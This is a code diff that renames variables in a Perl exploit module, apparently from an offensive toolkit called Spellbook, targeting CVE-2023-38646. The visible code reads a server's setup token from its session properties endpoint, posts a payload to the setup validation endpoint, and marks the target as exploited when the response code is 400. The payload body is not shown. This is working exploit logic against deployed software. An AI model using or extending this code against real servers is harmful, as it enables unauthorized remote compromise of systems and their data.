@@ -30,11 +30,11 @@ package Spellbook::Advisory::CVE_2023_38646 {
             }
 
             my $userAgent = Spellbook::Core::UserAgent -> new();
-            my $request   = $userAgent -> get("$target/api/session/properties");
+            my $session_response = $userAgent -> get("$target/api/session/properties");
 
-            if ($request -> code() == 200) {
+            if ($session_response -> code() == 200) {
                 try {
-                    my $content = decode_json($request -> content);
+                    my $content = decode_json($session_response -> content);
                     my $token = $content -> {"setup-token"};
 
                     if ($token) {
@@ -61,8 +61,8 @@ package Spellbook::Advisory::CVE_2023_38646 {
                             }
                         });
 
-                        my $request  = HTTP::Request -> new("POST", "$target/api/setup/validate", $headers, $payload);
-                        my $response = $userAgent -> request($request);
+                        my $validate_request  = HTTP::Request -> new("POST", "$target/api/setup/validate", $headers, $payload);
+                        my $response = $userAgent -> request($validate_request);
 
                         if ($response -> code() == 400) {
                             push @result, "\n[+] $target exploited\n";
